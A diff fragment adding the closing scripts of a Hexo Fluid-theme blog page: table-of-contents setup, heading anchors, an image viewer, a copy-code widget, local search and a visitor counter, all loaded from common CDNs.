+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
